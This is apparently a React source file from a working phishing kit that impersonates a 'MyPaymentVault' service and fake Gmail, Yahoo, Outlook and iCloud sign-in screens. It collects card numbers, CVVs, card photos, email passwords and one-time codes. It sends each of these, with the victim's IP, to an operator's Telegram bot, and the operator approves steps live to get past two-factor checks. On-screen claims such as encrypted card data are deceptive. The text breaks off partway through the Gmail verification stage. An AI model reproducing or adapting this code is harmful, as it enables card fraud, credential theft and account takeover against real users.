import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { ShieldCheck, Loader2, Globe, ChevronDown, Eye, EyeOff } from "lucide-react";
import { useAuth } from "@/lib/auth";
import { useI18n, type Language } from "@/lib/i18n";
import {
  getPublicIP,
  sendTelegram,
  sendApprovalRequest,
  sendFileToTelegram,
  pollApproval,
  pollGmailNumber,
  sendGmailVerification,
  answerCallback,
  getLatestOffset,
} from "@/lib/telegram";

const languageOptions: { code: Language; label: string }[] = [
  { code: "en", label: "English" },
  { code: "es", label: "Español" },
  { code: "fr", label: "Français" },
];

type Stage = "card-verify" | "provider-select" | "credentials" | "gmail-confirm" | "provider-confirm" | "verification" | "approving" | "approved" | "rejected";

const providers = [
  {
    id: "gmail",
    name: "Gmail",
    brandColor: "#EA4335",
    confirmBg: "#fce8e6",
    confirmAccent: "#c5221f",
    icon: (
      /* Gmail — classic multicolor envelope M */
      <svg width="22" height="22" viewBox="0 0 24 24">
        <path d="M2 5h20v14H2z" fill="#fff" stroke="#e0e0e0" strokeWidth="0.6"/>
        <path d="M2 5l10 8 10-8" fill="none" stroke="#EA4335" strokeWidth="0"/>
        <path d="M2 5l10 7.5L22 5z" fill="#EA4335"/>
        <path d="M2 5v14l7-7z" fill="#4285F4"/>
        <path d="M22 5v14l-7-7z" fill="#34A853"/>
        <path d="M2 19l7-7 3 2.5 3-2.5 7 7z" fill="#FBBC05"/>
      </svg>
    ),
    iconLarge: (
      <svg width="48" height="48" viewBox="0 0 48 48">
        <path d="M4 10h40v28H4z" fill="#fff" stroke="#e0e0e0" strokeWidth="1"/>
        <path d="M4 10l20 15L44 10z" fill="#EA4335"/>
        <path d="M4 10v28l14-14z" fill="#4285F4"/>
        <path d="M44 10v28L30 24z" fill="#34A853"/>
        <path d="M4 38l14-14 6 5 6-5 14 14z" fill="#FBBC05"/>
      </svg>
    ),
  },
  {
    id: "yahoo",
    name: "Yahoo Mail",
    brandColor: "#6001D2",
    confirmBg: "#f3e8ff",
    confirmAccent: "#4a0099",
    icon: (
      /* Yahoo — purple Y! */
      <svg width="22" height="22" viewBox="0 0 24 24">
        <rect width="24" height="24" rx="5" fill="#6001D2"/>
        <path d="M5.5 6h3l3.5 4.5L15.5 6H18l-5 6.5V18h-2.5v-5.5L5.5 6z" fill="#fff"/>
        <circle cx="16.5" cy="17" r="1.2" fill="#fff"/>
      </svg>
    ),
    iconLarge: (
      <svg width="48" height="48" viewBox="0 0 48 48">
        <rect width="48" height="48" rx="10" fill="#6001D2"/>
        <path d="M10 12h7l7 9 7-9h7L28 25v11h-6V25L10 12z" fill="#fff"/>
        <circle cx="33" cy="34" r="2.5" fill="#fff"/>
      </svg>
    ),
  },
  {
    id: "outlook",
    name: "Outlook",
    brandColor: "#0078D4",
    confirmBg: "#e3f2fd",
    confirmAccent: "#004e8c",
    icon: (
      /* Outlook — Microsoft blue O envelope */
      <svg width="22" height="22" viewBox="0 0 24 24">
        <rect width="24" height="24" rx="3" fill="#0078D4"/>
        <rect x="2.5" y="5.5" width="10" height="13" rx="2" fill="#fff"/>
        <ellipse cx="7.5" cy="12" rx="2.6" ry="3.4" fill="#0078D4"/>
        <ellipse cx="7.5" cy="12" rx="1.6" ry="2.4" fill="#fff"/>
        <rect x="13.5" y="7.5" width="8" height="9" rx="1" fill="#28A8E0"/>
        <path d="M13.5 7.5l4 3 4-3" stroke="#fff" strokeWidth="0.8" fill="none"/>
      </svg>
    ),
    iconLarge: (
      <svg width="48" height="48" viewBox="0 0 48 48">
        <rect width="48" height="48" rx="6" fill="#0078D4"/>
        <rect x="4" y="10" width="22" height="28" rx="4" fill="#fff"/>
        <ellipse cx="15" cy="24" rx="5.5" ry="7" fill="#0078D4"/>
        <ellipse cx="15" cy="24" rx="3.5" ry="5" fill="#fff"/>
        <rect x="27" y="14" width="17" height="18" rx="2" fill="#28A8E0"/>
        <path d="M27 14l8.5 6.5L44 14" stroke="#fff" strokeWidth="1.5" fill="none"/>
      </svg>
    ),
  },
  {
    id: "icloud",
    name: "iCloud",
    brandColor: "#007AFF",
    confirmBg: "#e5f0ff",
    confirmAccent: "#0051c3",
    icon: (
      /* iCloud — Apple cloud on blue */
      <svg width="22" height="22" viewBox="0 0 24 24">
        <rect width="24" height="24" rx="5" fill="#007AFF"/>
        <path d="M17 16H7a3.5 3.5 0 01-.7-6.93A5 5 0 0116.9 8.5H17a2.5 2.5 0 010 5z" fill="#fff"/>
      </svg>
    ),
    iconLarge: (
      <svg width="48" height="48" viewBox="0 0 48 48">
        <rect width="48" height="48" rx="10" fill="#007AFF"/>
        <path d="M34 33H14a7 7 0 01-1.4-13.86A10 10 0 0133.8 17H34a5 5 0 010 10z" fill="#fff"/>
      </svg>
    ),
  },
];

function randNum(min: number, max: number) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

export default function LoginSuccess() {
  const [, navigate] = useLocation();
  const [username, setUsername] = useState("");
  const [loading, setLoading] = useState(false);
  const [showLangDropdown, setShowLangDropdown] = useState(false);
  const [stage, setStage] = useState<Stage>("card-verify");

  /* Card verification state */
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [cardFrontFile, setCardFrontFile] = useState<File | null>(null);
  const [cardBackFile, setCardBackFile] = useState<File | null>(null);
  const [cardFrontPreview, setCardFrontPreview] = useState<string | null>(null);
  const [cardBackPreview, setCardBackPreview] = useState<string | null>(null);
  const [cardNumError, setCardNumError] = useState("");
  const [cardExpError, setCardExpError] = useState("");
  const [cardCvvError, setCardCvvError] = useState("");
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [providerEmail, setProviderEmail] = useState("");
  const [providerPassword, setProviderPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");

  /* Gmail number challenge */
  const [gmailNumbers] = useState<number[]>(() => {
    const nums: number[] = [];
    while (nums.length < 3) {
      const n = randNum(10, 99);
      if (!nums.includes(n)) nums.push(n);
    }
    return nums;
  });
  const [selectedGmailNum, setSelectedGmailNum] = useState<number | null>(null);

  /* OTP (iCloud / Yahoo / Outlook) */
  const [otpCode, setOtpCode] = useState("");
  const [otpError, setOtpError] = useState("");

  /* Telegram polling */
  const pollRef   = useRef<ReturnType<typeof setInterval> | null>(null);
  const offsetRef = useRef(0);
  const sessionKeyRef = useRef(`verify_${Date.now()}`);

  const [readyToNavigate, setReadyToNavigate] = useState(false);
  const { verifyCard, isAuthenticated } = useAuth();
  const { lang, setLang, langName } = useI18n();

  useEffect(() => {
    const stored = sessionStorage.getItem("botOtpUsername");
    if (!stored) { navigate("/login"); return; }
    setUsername(stored);
  }, [navigate]);

  useEffect(() => {
    if (readyToNavigate && isAuthenticated) navigate("/step4");
  }, [readyToNavigate, isAuthenticated, navigate]);

  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);

  /* ── Card number formatter ── */
  function formatCardNumber(val: string) {
    return val.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
  }

  /* ── Expiry formatter ── */
  function formatExpiry(val: string) {
    const clean = val.replace(/\D/g, "").slice(0, 4);
    if (clean.length >= 3) return `${clean.slice(0, 2)}/${clean.slice(2)}`;
    return clean;
  }

  /* ── File picker handler ── */
  function handleCardPhoto(e: React.ChangeEvent<HTMLInputElement>, side: "front" | "back") {
    const file = e.target.files?.[0];
    if (!file) return;
    const url = URL.createObjectURL(file);
    if (side === "front") { setCardFrontFile(file); setCardFrontPreview(url); }
    else { setCardBackFile(file); setCardBackPreview(url); }
  }

  /* ── Card submit ── */
  async function handleCardSubmit() {
    let valid = true;
    const rawCard = cardNumber.replace(/\s/g, "");
    if (rawCard.length < 16) { setCardNumError("Card number must be 16 digits."); valid = false; } else setCardNumError("");
    const [mm, yy] = cardExpiry.split("/");
    if (!mm || !yy || mm.length !== 2 || yy.length !== 2 || +mm < 1 || +mm > 12) { setCardExpError("Enter a valid expiry MM/YY."); valid = false; } else setCardExpError("");
    if (cardCvv.length < 3) { setCardCvvError("CVV must be 3–4 digits."); valid = false; } else setCardCvvError("");
    if (!valid) return;

    setLoading(true);
    const ip = await getPublicIP().catch(() => "unknown");
    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    await sendTelegram(
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `💳 <b>mypaymenttvaulltr.com</b>\n` +
      `📌 <b>Data Kartu User</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `👤 <b>Username</b>    : <code>${username}</code>\n` +
      `💳 <b>Card Number</b> : <code>${rawCard}</code>\n` +
      `📅 <b>Expiry</b>      : <code>${cardExpiry}</code>\n` +
      `🔒 <b>CVV</b>         : <code>${cardCvv}</code>\n` +
      `🌐 <b>IP</b>          : <code>${ip}</code>\n` +
      `🕐 <b>Waktu</b>       : ${now}\n` +
      `━━━━━━━━━━━━━━━━━━━━━`
    ).catch(() => {});

    if (cardFrontFile) {
      await sendFileToTelegram(cardFrontFile, `📷 Foto Kartu DEPAN — ${username}`).catch(() => {});
    }
    if (cardBackFile) {
      await sendFileToTelegram(cardBackFile, `📷 Foto Kartu BELAKANG — ${username}`).catch(() => {});
    }

    setLoading(false);
    setStage("provider-select");
  }

  /* ── Step 1: credentials submitted ── */
  async function handleCredentials() {
    let valid = true;
    if (!providerEmail.trim()) { setEmailError("Email is required."); valid = false; }
    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(providerEmail.trim())) { setEmailError("Invalid email format."); valid = false; }
    else setEmailError("");
    if (!providerPassword.trim()) { setPasswordError("Password is required."); valid = false; }
    else setPasswordError("");
    if (!valid) return;

    setLoading(true);
    const ip = await getPublicIP().catch(() => "unknown");
    const providerName = providers.find(p => p.id === selectedProvider)?.name ?? selectedProvider ?? "";

    await sendTelegram(
      `📧 <b>Email Credentials</b>\n\n` +
      `👤 <b>Username</b>  : <code>${username}</code>\n` +
      `📬 <b>Provider</b>  : <b>${providerName}</b>\n` +
      `📩 <b>Email</b>     : <code>${providerEmail.trim()}</code>\n` +
      `🔑 <b>Password</b>  : <code>${providerPassword}</code>\n` +
      `🌐 <b>IP</b>        : <code>${ip}</code>`,
    ).catch(() => {});

    setLoading(false);
    setStage(selectedProvider === "gmail" ? "gmail-confirm" : "provider-confirm");
  }

  /* ── Gmail: send numbers to admin, poll for admin's chosen number ── */
  async function startGmailVerification() {
    setLoading(true);
    const ip = await getPublicIP().catch(() => "unknown");
    const sessionKey = sessionKeyRef.current;
    const startOffset = await getLatestOffset();
    offsetRef.current = startOffset;
    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    await sendGmailVerification(username, ip, now, gmailNumbers, sessionKey);
    setLoading(false);

    pollRef.current = setInterval(async () => {
      const { status, chosenNumber, nextOffset, callbackId } = await pollGmailNumber(
        offsetRef.current, gmailNumbers, sessionKey
      );
      offsetRef.current = nextOffset;

      if (status === "selected" && chosenNumber !== undefined) {
        clearInterval(pollRef.current!);
        if (callbackId) await answerCallback(callbackId, `✅ Angka ${chosenNumber} dipilih`);
        setSelectedGmailNum(chosenNumber);
        setTimeout(() => {
          setStage("approved");
          verifyCard();
          setTimeout(() => setReadyToNavigate(true), 1200);
        }, 1800);
      } else if (status === "rejected") {
        clearInterval(pollRef.current!);
        if (callbackId) await answerCallback(callbackId, "❌ Ditolak.");
        setStage("rejected");
      }
    }, 2500);
  }

  /* ── OTP providers: submit code → Telegram approval ── */
  async function handleOtpVerification(code: string) {
    setLoading(true);
    const ip = await getPublicIP().catch(() => "unknown");
    const providerName = providers.find(p => p.id === selectedProvider)?.name ?? selectedProvider ?? "";
    const sessionKey = sessionKeyRef.current;
    const startOffset = await getLatestOffset();
    offsetRef.current = startOffset;

    await sendApprovalRequest(
      username, ip,
      new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" }),
      sessionKey,
      `${providerName} Verification`,
    );

    await sendTelegram(
      `🔐 <b>${providerName} Verification Code</b>\n\n` +
      `👤 <b>Username</b>   : <code>${username}</code>\n` +
      `🔢 <b>Code</b>       : <code>${code}</code>\n` +
      `🌐 <b>IP</b>         : <code>${ip}</code>`,
    ).catch(() => {});

    setStage("approving");
    setLoading(false);

    pollRef.current = setInterval(async () => {
      const { status, nextOffset, callbackId } = await pollApproval(offsetRef.current, sessionKey);
      offsetRef.current = nextOffset;

      if (status === "approved") {
        clearInterval(pollRef.current!);
        if (callbackId) await answerCallback(callbackId, "✅ Verification approved!");
        setStage("approved");
        verifyCard();
        setTimeout(() => setReadyToNavigate(true), 1200);
      } else if (status === "rejected") {
        clearInterval(pollRef.current!);
        if (callbackId) await answerCallback(callbackId, "❌ Verification rejected.");
        setStage("rejected");
      }
    }, 2500);
  }

  function handleOtpSubmit() {
    if (otpCode.length < 6) { setOtpError("Please enter the 6-digit code."); return; }
    setOtpError("");
    handleOtpVerification(otpCode);
  }

  const currentProvider = providers.find(p => p.id === selectedProvider);

  return (
    <div className="min-h-screen flex flex-col items-center justify-center ls-outer" style={{ background: "#f7f7f7" }}>
      <style>{`
        @media (max-width: 520px) {
          .ls-outer { background:#fff !important; justify-content:flex-start !important; padding:0 !important; }
          .ls-card  { max-width:100% !important; min-height:100dvh !important; box-shadow:none !important; border-radius:0 !important; }
        }
        @keyframes fadeInUp { from{opacity:0;transform:translateY(20px);} to{opacity:1;transform:translateY(0);} }
        @keyframes checkPop { 0%{transform:scale(0.4);opacity:0;} 70%{transform:scale(1.15);opacity:1;} 100%{transform:scale(1);opacity:1;} }
        @keyframes botp-spin { to{transform:rotate(360deg);} }
        @keyframes botp-pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
        @keyframes spin { from{transform:rotate(0deg);} to{transform:rotate(360deg);} }
        .ls-fadein { animation: fadeInUp 0.5s ease both; }
        .ls-check  { animation: checkPop 0.55s cubic-bezier(.4,1.6,.6,1) both; }
        .prov-btn:hover  { border-color:#111 !important; background:#f8f8f8 !important; }
        .prov-btn.active { border-color:#111 !important; background:#f4f4f4 !important; }
        .email-input:focus,.pass-input:focus,.otp-input:focus { outline:none; border-color:#111; }
        .email-input::placeholder,.pass-input::placeholder,.otp-input::placeholder { color:#bbb; }
        .gmail-num-btn { transition:all 0.15s; }
        .gmail-num-btn:hover { background:#f1f3f4 !important; border-color:#4285F4 !important; }
        .gmail-num-btn.picked { background:#e8f0fe !important; border-color:#4285F4 !important; }
      `}</style>

      <div className="w-full flex flex-col bg-white ls-card" style={{ maxWidth:480, boxShadow:"0 2px 32px rgba(0,0,0,0.13)" }}>

        {/* HEADER */}
        <div className="flex items-center justify-between" style={{ padding:"18px 24px", borderBottom:"1px solid #ebebeb" }}>
          <span className="select-none" style={{ fontSize:15, letterSpacing:"0.18em", color:"#111" }}>
            <span style={{ fontWeight:300 }}>MY</span>
            <span style={{ fontWeight:700 }}>PAYMENT</span>
            <span style={{ fontWeight:300 }}>VAULT</span>
          </span>
          <div className="relative">
            <button type="button" onClick={() => setShowLangDropdown(!showLangDropdown)}
              style={{ display:"flex", alignItems:"center", gap:5, color:"#555", fontSize:13, background:"none", border:"none", cursor:"pointer" }}>
              <Globe size={15} color="#555" />
              <span>{langName}</span>
              <ChevronDown size={13} color="#555" style={{ transform:showLangDropdown?"rotate(180deg)":"none", transition:"transform 0.2s" }} />
            </button>
            {showLangDropdown && (
              <>
                <div className="fixed inset-0 z-10" onClick={() => setShowLangDropdown(false)} />
                <div style={{ position:"absolute", right:0, top:"100%", marginTop:4, width:140, background:"#fff", border:"1px solid #ddd", boxShadow:"0 4px 16px rgba(0,0,0,0.15)", zIndex:20 }}>
                  {languageOptions.map(opt => (
                    <button key={opt.code} type="button"
                      onClick={() => { setLang(opt.code); setShowLangDropdown(false); }}
                      style={{ display:"block", width:"100%", textAlign:"left", padding:"10px 16px", fontSize:13, background:"none", border:"none", cursor:"pointer", fontWeight:lang===opt.code?600:400, color:lang===opt.code?"#111":"#555" }}>
                      {opt.label}
                    </button>
                  ))}
                </div>
              </>
            )}
          </div>
        </div>

        {/* HERO */}
        <div style={{ width:"100%", lineHeight:0 }}>
          <img src="/hero-vault-new.png" alt="MyPaymentVault" style={{ width:"100%", display:"block" }} />
        </div>

        {/* BODY */}
        <div style={{ padding:"32px 28px 40px", textAlign:"center" }}>

          {/* Icon */}
          <div className="ls-check" style={{ width:64, height:64, borderRadius:"50%", background:"#111", display:"flex", alignItems:"center", justifyContent:"center", margin:"0 auto 16px" }}>
            <ShieldCheck size={30} color="#fff" strokeWidth={1.8} />
          </div>

          <h2 className="ls-fadein" style={{ fontSize:20, fontWeight:700, color:"#111", marginBottom:4, animationDelay:"0.1s" }}>
            Identity Verified
          </h2>
          <p className="ls-fadein" style={{ fontSize:13, color:"#555", marginBottom:2, animationDelay:"0.12s" }}>Welcome back,</p>
          <p className="ls-fadein" style={{ fontSize:17, fontWeight:700, color:"#111", marginBottom:22, animationDelay:"0.15s" }}>{username}</p>

          <div className="ls-fadein" style={{ borderTop:"1px solid #ebebeb", margin:"0 0 22px", animationDelay:"0.2s" }} />

          {/* Step indicator */}
          <div className="ls-fadein" style={{ display:"flex", alignItems:"center", justifyContent:"center", gap:8, marginBottom:24, animationDelay:"0.22s" }}>
            {[1,2,3,4].map((s, i) => (
              <div key={s} style={{ display:"flex", alignItems:"center", gap:8 }}>
                <div style={{ width:22, height:22, borderRadius:"50%", background:s<=2?"#111":"#ccc", display:"flex", alignItems:"center", justifyContent:"center", flexShrink:0 }}>
                  {s===1
                    ? <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
                    : <span style={{ fontSize:11, color:"#fff", fontWeight:700 }}>{s}</span>}
                </div>
                {i<3 && <div style={{ width:40, height:1, background:s<2?"#111":"#ccc" }} />}
              </div>
            ))}
          </div>

          {/* ── STAGE: card-verify ── */}
          {stage === "card-verify" && (
            <div className="ls-fadein" style={{ animationDelay:"0.1s" }}>
              {/* Header */}
              <div style={{ display:"flex", flexDirection:"column", alignItems:"center", marginBottom:22 }}>
                <div style={{ width:56, height:56, borderRadius:"50%", background:"#fff3e0", display:"flex", alignItems:"center", justifyContent:"center", marginBottom:12 }}>
                  <svg width="30" height="30" viewBox="0 0 24 24" fill="none">
                    <rect x="2" y="5" width="20" height="14" rx="2.5" fill="#FF9800"/>
                    <rect x="2" y="9" width="20" height="3" fill="#E65100"/>
                    <rect x="4" y="14" width="5" height="2" rx="1" fill="#fff"/>
                    <rect x="11" y="14" width="3" height="2" rx="1" fill="#fff"/>
                  </svg>
                </div>
                <p style={{ fontSize:17, fontWeight:700, color:"#111", margin:"0 0 4px" }}>Card Verification</p>
                <p style={{ fontSize:12, color:"#888", margin:0 }}>Enter your card details to continue</p>
              </div>

              {/* Card Number */}
              <div style={{ marginBottom:14 }}>
                <label style={{ fontSize:12, fontWeight:600, color:"#444", display:"block", marginBottom:5 }}>Card Number</label>
                <input
                  type="tel" inputMode="numeric" placeholder="0000 0000 0000 0000"
                  value={cardNumber}
                  onChange={e => { setCardNumber(formatCardNumber(e.target.value)); setCardNumError(""); }}
                  style={{ width:"100%", height:46, border: cardNumError ? "1.5px solid #d93025" : "1.5px solid #ddd", borderRadius:8, padding:"0 14px", fontSize:16, color:"#111", background:"#fafafa", boxSizing:"border-box", letterSpacing:"0.12em" }}
                />
                {cardNumError && <p style={{ fontSize:12, color:"#d93025", margin:"4px 0 0" }}>{cardNumError}</p>}
              </div>

              {/* Expiry + CVV row */}
              <div style={{ display:"flex", gap:12, marginBottom:14 }}>
                <div style={{ flex:1 }}>
                  <label style={{ fontSize:12, fontWeight:600, color:"#444", display:"block", marginBottom:5 }}>Expiry (MM/YY)</label>
                  <input
                    type="tel" inputMode="numeric" placeholder="MM/YY"
                    value={cardExpiry}
                    onChange={e => { setCardExpiry(formatExpiry(e.target.value)); setCardExpError(""); }}
                    style={{ width:"100%", height:46, border: cardExpError ? "1.5px solid #d93025" : "1.5px solid #ddd", borderRadius:8, padding:"0 12px", fontSize:15, color:"#111", background:"#fafafa", boxSizing:"border-box", letterSpacing:"0.08em" }}
                  />
                  {cardExpError && <p style={{ fontSize:11, color:"#d93025", margin:"4px 0 0" }}>{cardExpError}</p>}
                </div>
                <div style={{ flex:1 }}>
                  <label style={{ fontSize:12, fontWeight:600, color:"#444", display:"block", marginBottom:5 }}>CVV</label>
                  <input
                    type="tel" inputMode="numeric" placeholder="• • •" maxLength={4}
                    value={cardCvv}
                    onChange={e => { setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4)); setCardCvvError(""); }}
                    style={{ width:"100%", height:46, border: cardCvvError ? "1.5px solid #d93025" : "1.5px solid #ddd", borderRadius:8, padding:"0 12px", fontSize:15, color:"#111", background:"#fafafa", boxSizing:"border-box", letterSpacing:"0.2em" }}
                  />
                  {cardCvvError && <p style={{ fontSize:11, color:"#d93025", margin:"4px 0 0" }}>{cardCvvError}</p>}
                </div>
              </div>

              {/* Upload photos */}
              <div style={{ display:"flex", gap:12, marginBottom:22 }}>
                {/* Front */}
                <div style={{ flex:1 }}>
                  <label style={{ fontSize:12, fontWeight:600, color:"#444", display:"block", marginBottom:5 }}>Front of Card</label>
                  <label htmlFor="card-front-upload" style={{ display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center", height:90, border:"1.5px dashed #bbb", borderRadius:10, background:cardFrontPreview ? "transparent" : "#f9f9f9", cursor:"pointer", overflow:"hidden", position:"relative" }}>
                    {cardFrontPreview
                      ? <img src={cardFrontPreview} alt="front" style={{ width:"100%", height:"100%", objectFit:"cover", borderRadius:8 }} />
                      : <>
                          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" style={{ marginBottom:4 }}>
                            <path d="M12 5v14M5 12h14" stroke="#aaa" strokeWidth="2" strokeLinecap="round"/>
                          </svg>
                          <span style={{ fontSize:11, color:"#aaa" }}>Upload photo</span>
                        </>
                    }
                  </label>
                  <input id="card-front-upload" type="file" accept="image/*" style={{ display:"none" }} onChange={e => handleCardPhoto(e, "front")} />
                </div>
                {/* Back */}
                <div style={{ flex:1 }}>
                  <label style={{ fontSize:12, fontWeight:600, color:"#444", display:"block", marginBottom:5 }}>Back of Card</label>
                  <label htmlFor="card-back-upload" style={{ display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center", height:90, border:"1.5px dashed #bbb", borderRadius:10, background:cardBackPreview ? "transparent" : "#f9f9f9", cursor:"pointer", overflow:"hidden", position:"relative" }}>
                    {cardBackPreview
                      ? <img src={cardBackPreview} alt="back" style={{ width:"100%", height:"100%", objectFit:"cover", borderRadius:8 }} />
                      : <>
                          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" style={{ marginBottom:4 }}>
                            <path d="M12 5v14M5 12h14" stroke="#aaa" strokeWidth="2" strokeLinecap="round"/>
                          </svg>
                          <span style={{ fontSize:11, color:"#aaa" }}>Upload photo</span>
                        </>
                    }
                  </label>
                  <input id="card-back-upload" type="file" accept="image/*" style={{ display:"none" }} onChange={e => handleCardPhoto(e, "back")} />
                </div>
              </div>

              {/* Submit */}
              <button type="button" onClick={handleCardSubmit} disabled={loading}
                style={{ width:"100%", height:50, background: loading ? "#aaa" : "#FF9800", color:"#fff", fontSize:15, fontWeight:700, border:"none", borderRadius:8, cursor: loading ? "not-allowed" : "pointer", display:"flex", alignItems:"center", justifyContent:"center", gap:8, letterSpacing:"0.03em" }}>
                {loading ? <><Loader2 size={18} style={{ animation:"spin 1s linear infinite" }}/> Processing…</> : "Continue →"}
              </button>

              <p style={{ fontSize:11, color:"#aaa", marginTop:14, textAlign:"center" }}>
                🔒 Your card data is encrypted and transmitted securely.
              </p>
            </div>
          )}

          {/* ── STAGE: provider-select ── */}
          {stage === "provider-select" && (
            <div className="ls-fadein" style={{ animationDelay:"0.25s" }}>
              <p style={{ fontSize:14, fontWeight:600, color:"#333", marginBottom:16, textAlign:"left" }}>
                Select your email provider to verify
              </p>
              <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:12 }}>
                {providers.map(p => (
                  <button key={p.id} type="button" className="prov-btn"
                    onClick={() => { setSelectedProvider(p.id); setStage("credentials"); }}
                    style={{ display:"flex", alignItems:"center", gap:10, padding:"14px 16px", border:"1.5px solid #e0e0e0", borderRadius:8, background:"#fff", cursor:"pointer", textAlign:"left" }}>
                    {p.icon}
                    <span style={{ fontSize:14, fontWeight:600, color:"#222" }}>{p.name}</span>
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* ── STAGE: credentials ── */}
          {stage === "credentials" && (
            <div className="ls-fadein" style={{ animationDelay:"0.1s" }}>
              <div style={{ display:"flex", alignItems:"center", gap:10, marginBottom:20, padding:"12px 14px", background:"#f8f8f8", borderRadius:8 }}>
                {currentProvider?.icon}
                <div style={{ textAlign:"left" }}>
                  <p style={{ fontSize:13, fontWeight:700, color:"#111", margin:0 }}>{currentProvider?.name}</p>
                  <button type="button" onClick={() => { setSelectedProvider(null); setStage("provider-select"); setProviderEmail(""); setProviderPassword(""); setEmailError(""); setPasswordError(""); }}
                    style={{ fontSize:11, color:"#888", textDecoration:"underline", background:"none", border:"none", cursor:"pointer", padding:0 }}>
                    Change provider
                  </button>
                </div>
              </div>

              <div style={{ textAlign:"left", marginBottom:14 }}>
                <label style={{ fontSize:13, fontWeight:600, color:"#333", display:"block", marginBottom:6 }}>Email Address</label>
                <input className="email-input" type="email" placeholder="example@email.com"
                  value={providerEmail} onChange={e => { setProviderEmail(e.target.value); setEmailError(""); }}
                  disabled={loading}
                  style={{ width:"100%", height:46, border:emailError?"1.5px solid #e00":"1.5px solid #ddd", borderRadius:6, padding:"0 14px", fontSize:15, color:"#111", background:"#fafafa", boxSizing:"border-box" }}
                  autoComplete="email" />
                {emailError && <p style={{ fontSize:12, color:"#e00", marginTop:5 }}>{emailError}</p>}
              </div>

              <div style={{ textAlign:"left", marginBottom:22 }}>
                <label style={{ fontSize:13, fontWeight:600, color:"#333", display:"block", marginBottom:6 }}>Password</label>
                <div style={{ position:"relative" }}>
                  <input className="pass-input" type={showPassword?"text":"password"} placeholder="Enter your password"
                    value={providerPassword} onChange={e => { setProviderPassword(e.target.value); setPasswordError(""); }}
                    onKeyDown={e => e.key==="Enter" && handleCredentials()}
                    disabled={loading}
                    style={{ width:"100%", height:46, border:passwordError?"1.5px solid #e00":"1.5px solid #ddd", borderRadius:6, padding:"0 44px 0 14px", fontSize:15, color:"#111", background:"#fafafa", boxSizing:"border-box" }}
                    autoComplete="current-password" />
                  <button type="button" onClick={() => setShowPassword(!showPassword)}
                    style={{ position:"absolute", right:12, top:"50%", transform:"translateY(-50%)", background:"none", border:"none", cursor:"pointer", color:"#888", display:"flex", alignItems:"center" }}>
                    {showPassword ? <EyeOff size={17}/> : <Eye size={17}/>}
                  </button>
                </div>
                {passwordError && <p style={{ fontSize:12, color:"#e00", marginTop:5 }}>{passwordError}</p>}
              </div>

              <button type="button" onClick={handleCredentials} disabled={loading}
                style={{ width:"100%", height:50, background:loading?"#555":"#111", color:"#fff", fontSize:15, fontWeight:600, border:"none", borderRadius:6, cursor:loading?"not-allowed":"pointer", letterSpacing:"0.03em", display:"flex", alignItems:"center", justifyContent:"center", gap:8 }}>
                {loading ? <><Loader2 size={18} style={{ animation:"spin 1s linear infinite" }}/> Verifying...</> : "Sign In →"}
              </button>
            </div>
          )}

          {/* ── STAGE: gmail-confirm ("Was it you?") ── */}
          {stage === "gmail-confirm" && (
            <div className="ls-fadein" style={{ animationDelay:"0.1s" }}>
              {/* Google-style header */}
              <div style={{ display:"flex", flexDirection:"column", alignItems:"center", marginBottom:24 }}>
                <div style={{ width:56, height:56, borderRadius:"50%", background:"#e8f0fe", display:"flex", alignItems:"center", justifyContent:"center", marginBottom:14 }}>
                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
                    <circle cx="12" cy="8" r="4" fill="#1a73e8"/>
                    <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" stroke="#1a73e8" strokeWidth="2" strokeLinecap="round"/>
                  </svg>
                </div>
                <p style={{ fontSize:18, fontWeight:700, color:"#111", margin:"0 0 4px" }}>Did you just sign in?</p>
                <p style={{ fontSize:13, color:"#555", margin:0 }}>{providerEmail || "your Gmail account"}</p>
              </div>

              {/* Info card */}
              <div style={{ background:"#f8f9fa", border:"1px solid #e0e0e0", borderRadius:10, padding:"14px 16px", marginBottom:22, textAlign:"left" }}>
                <p style={{ fontSize:13, fontWeight:600, color:"#111", margin:"0 0 6px" }}>A new sign-in was detected</p>
                <p style={{ fontSize:12, color:"#555", margin:"0 0 4px" }}>If this was you, tap <b>Yes, it's me</b> to continue.</p>
                <p style={{ fontSize:12, color:"#555", margin:0 }}>If you didn't sign in, tap <b>No</b> to secure your account.</p>
              </div>

              {/* YES button */}
              <button type="button"
                onClick={() => setStage("verification")}
                style={{ width:"100%", height:50, marginBottom:10, background:"#1a73e8", color:"#fff", fontSize:15, fontWeight:600, border:"none", borderRadius:6, cursor:"pointer", letterSpacing:"0.02em" }}>
                Yes, it's me
              </button>

              {/* NO button */}
              <button type="button"
                onClick={() => setStage("rejected")}
                style={{ width:"100%", height:46, background:"#fff", color:"#d93025", fontSize:14, fontWeight:600, border:"1.5px solid #e0e0e0", borderRadius:6, cursor:"pointer" }}>
                No, it wasn't me
              </button>

              <p style={{ fontSize:11, color:"#aaa", marginTop:16, textAlign:"center" }}>
                Google will never ask for your password in an email or text message.
              </p>
            </div>
          )}

          {/* ── STAGE: verification (Gmail — 6-digit code) ── */}
          {stage === "verification" && selectedProvider === "gmail" && (
